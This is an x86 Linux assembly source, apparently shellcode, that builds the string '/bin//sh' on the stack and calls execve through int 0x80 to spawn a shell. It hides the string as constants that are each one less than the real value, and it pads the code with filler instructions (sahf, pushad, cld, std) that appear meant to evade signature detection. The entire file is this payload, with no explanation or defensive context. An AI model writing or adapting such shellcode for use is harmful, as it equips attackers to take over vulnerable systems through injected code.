global _start

_start:

       sahf

       xor    eax,eax
       pushad
       push   eax

       cld
       mov esi, 0x68732f2e
       inc esi
       cdq
       mov edi, 0x6e69622e
       inc edi

       push esi
       std
       push edi

       mov ebx, esp
       push eax

       push ebx

       mov al, 11
       int 0x80
